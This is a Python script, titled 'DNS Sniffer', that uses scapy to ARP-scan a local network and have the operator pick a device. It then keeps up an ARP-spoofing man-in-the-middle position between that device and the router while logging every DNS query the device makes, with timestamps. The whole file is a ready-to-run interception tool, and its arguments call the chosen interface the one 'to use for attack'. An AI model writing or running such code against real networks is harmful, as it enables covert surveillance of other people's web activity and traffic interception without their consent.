
import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff , DNS, srp, Ether, ARP
from mac_vendor_lookup import MacLookup, VendorNotFoundError



parser = argparse.ArgumentParser(description='DNS Sniffer')
#parser.add_argument('--targetip', help='Target device you want to watch', required=True)
parser.add_argument('--network',help='Network to scan (eg. "192.168.0.0/24)', required=True)
parser.add_argument('--iface', help='Interface to use for attack', required=True)
parser.add_argument('--routerip',help='My home router gateway ip',required=True)
opts = parser.parse_args()



def arp_scan(network, iface):
    """
    :param network: The network to scan (e.g., '192.168.0.0/24').
    :param iface: The network interface to use for scanning.
    :return: The selected IP address as input from the user.
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=5, iface=iface, verbose=False)
    print(f"{Fore.RED}############### NETWORK DEVICES ########################{Style.RESET_ALL}\n")
    for sent, received in ans:
        mac = received.hwsrc
        ip = received.psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = "Unregcognized MAC"

        print(f"{Fore.BLUE}{ip}{Style.RESET_ALL}")
    return input("\nPick a device IP: ")




class Device:


    def __init__ (self,routerip,targetip,iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface


    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying...')
                continue

    def capture(self):
        print('Runnig capture...')
        sniff(iface=self.iface, prn=self.dns, 
              filter=f'src host {self.targetip} and udp port 53')
        
    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime('%m/%d/%Y %H:%M:%S',localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')




    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())        
        t1.start()
        t2.start()


if __name__ == '__main__':
    targetip = arp_scan(opts.network,opts.iface)
    device = Device(opts.routerip, targetip, opts.iface)
    device.watch()
